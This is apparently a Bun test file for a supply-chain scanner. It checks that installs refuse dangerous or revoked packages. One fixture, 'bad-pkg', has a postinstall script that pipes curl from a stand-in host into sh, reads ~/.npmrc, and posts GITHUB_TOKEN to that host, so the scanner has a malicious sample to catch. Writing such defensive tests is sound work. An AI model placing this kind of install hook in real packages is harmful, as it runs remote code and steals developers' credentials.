// Spec: with one bunfig line, stock `bun install` / `bun add` consult the registry and refuse
// revoked or dangerous versions. This is the Bun-first path: no wrapper needed.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, writeFileSync, cpSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, writeProjectConfig, run, installedVersion, ROOT, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
let clock = Date.parse("2026-02-01T00:00:00Z");
let reg: Registry;
let apmUser: string;
let alice: string;
let work: string;

async function publish(name: string, version: string, token: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, { name, version, ...extra }, reg, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`publish ${name}@${version} failed: ${r.out}`);
}

function scannedApp(deps: Record<string, string> = {}): string {
  const app = writeConsumer(work, reg, alice, deps);
  writeFileSync(join(app, "bunfig.toml"), `[install]\nregistry = { url = "${reg.url}", token = "${alice}" }\n\n[install.security]\nscanner = "@apm/bun-scanner"\n`);
  return app;
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  apmUser = await addUser(reg, "apm");
  alice = await addUser(reg, "alice");
  work = mkdtempSync(join(tmpdir(), "apm-scan-"));
  // publish the scanner package from this repo to the test registry
  const src = join(ROOT, "packages", "bun-scanner");
  const dst = mkdtempSync(join(work, "scanner-"));
  cpSync(src, dst, { recursive: true, filter: (p) => !p.includes("node_modules") });
  const pj: unknown = JSON.parse(readFileSync(join(dst, "package.json"), "utf8"));
  writeFileSync(join(dst, "package.json"), JSON.stringify({ ...Object(pj), private: false, publishConfig: { access: "public" } }, null, 2));
  writeProjectConfig(dst, reg, apmUser);
  const sb = makeSandbox(reg, apmUser);
  const p = await run(["bun", "publish"], { cwd: dst, env: sb.env });
  if (p.code !== 0) throw new Error(`scanner publish failed: ${p.out}`);

  await publish("good-pkg", "1.0.0", alice);
  await publish("bad-pkg", "1.0.0", alice, {
    scripts: { postinstall: "node p.js" },
    files: { "index.js": "module.exports=1;\n", "p.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.GITHUB_TOKEN}); eval('1');\n" },
  });
  await publish("soon-revoked", "1.0.0", alice);
  clock += 10 * DAY;
});
afterAll(async () => {
  await reg?.stop();
});

describe("@apm/bun-scanner with stock bun", () => {
  test("bun add of a clean package passes the scanner", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const r = await run(["bun", "add", "good-pkg"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "good-pkg")).toBe("1.0.0");
  });

  test("bun add of a dangerous package is cancelled with the reason", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const r = await run(["bun", "add", "bad-pkg"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("bad-pkg");
    expect(r.out.toLowerCase()).toMatch(/score|install-script/);
    expect(installedVersion(app, "bad-pkg")).toBeNull();
  });

  test("bun install refuses a lockfile that contains a version revoked after it was locked", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const a = await run(["bun", "add", "soon-revoked"], { cwd: app, env: sb.env });
    expect(a.code, a.out).toBe(0);
    const rv = await fetch(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "soon-revoked", version: "1.0.0", reason: "compromised publish token", password: "correct-horse-battery" }),
    });
    expect(rv.status).toBe(200);
    // a 10-day-old version goes to revoke-pending first; the scanner treats pending as fatal too
    const r = await run(["bun", "install"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("compromised publish token");
  });
});
